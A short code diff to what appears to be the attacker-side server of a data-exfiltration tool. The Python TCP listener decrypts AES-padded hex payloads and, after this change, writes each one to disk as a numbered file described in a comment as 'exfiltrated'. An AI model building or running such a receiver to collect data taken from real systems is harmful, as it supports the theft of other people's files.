@@ -59,6 +59,8 @@ def main(IP, PORT):
     sock.listen(3)
     print(f"TCP {IP}:{PORT}")
 
+    # Used to give every exfiltrated file a unique name
+    file_id = 0
 
     while True:
         data = ""
@@ -91,9 +93,11 @@ def main(IP, PORT):
             enc_bytes = bytes.fromhex(data)
             dec_bytes = cipher_dec.decrypt(enc_bytes)
             dec_bytes = unpad(dec_bytes, 16)
-            print(f"RECV:\n{dec_bytes}\n")
 
-
+            with open(f"file{file_id}", "wb") as fd:
+                fd.write(dec_bytes)
+            print(f"Recieved file{file_id}")
+            file_id += 1
 
 
 
